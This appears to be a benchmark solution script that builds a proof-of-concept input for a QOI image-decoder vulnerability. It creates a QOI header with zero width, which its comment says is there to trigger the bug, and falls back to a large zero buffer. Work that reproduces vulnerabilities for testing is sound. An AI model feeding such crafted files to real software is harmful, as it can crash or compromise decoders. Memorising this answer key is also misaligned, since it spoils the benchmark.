import os
import tarfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        project = self._detect_project(src_path)
        if project == "qoi":
            return self._make_qoi_zero_dimension()
        # Fallback: generic large zero buffer (may trigger simple formats that take raw header)
        return b"\x00" * 20000

    def _detect_project(self, src_path: str) -> str:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    name = member.name.lower()
                    base = os.path.basename(name)
                    # Heuristics for QOI project
                    if base in ("qoi.h", "qoi.c", "qoi_test.c", "qoi_demo.c"):
                        return "qoi"
                    if "qoi" in name:
                        return "qoi"
        except Exception:
            pass
        return "unknown"

    def _make_qoi_zero_dimension(self) -> bytes:
        # QOI header:
        # magic      : 4 bytes 'qoif'
        # width      : 4 bytes big-endian
        # height     : 4 bytes big-endian
        # channels   : 1 byte (3 = RGB)
        # colorspace : 1 byte (0 = sRGB with linear alpha)
        magic = b"qoif"
        width = struct.pack(">I", 0)   # zero width to trigger the vulnerability
        height = struct.pack(">I", 1)  # minimal non-zero height
        channels = b"\x03"
        colorspace = b"\x00"
        header = magic + width + height + channels + colorspace

        # Minimal QOI payload: no pixel data, just end marker.
        # QOI_END / padding: 7x 0x00 + 0x01
        qoi_end = b"\x00" * 7 + b"\x01"

        return header + qoi_end